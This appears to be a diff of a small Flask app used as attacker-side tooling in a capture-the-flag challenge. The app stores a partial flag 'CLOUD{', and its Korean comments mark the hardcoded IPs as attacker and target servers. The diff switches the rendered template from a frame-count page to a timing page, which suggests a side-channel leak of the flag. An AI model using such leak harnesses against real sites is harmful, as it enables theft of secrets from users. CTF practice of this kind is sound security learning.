@@ -5,7 +5,7 @@ app = Flask(__name__)
 app.secret_key = os.urandom(32)
 
 flag = 'CLOUD{'
-url = 'http://3.35.210.51:8000/' # 공격자 서버
+url = 'http://16.184.47.79:8000' # 타겟 서버
 
 # 구한 flag 출력
 @app.route('/')
@@ -38,7 +38,7 @@ def frame():
 def timing():
     global flag
     global url
-    return render_template('frame_count.html', flag=flag,url=url)
+    return render_template('timing.html', flag=flag,url=url)
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
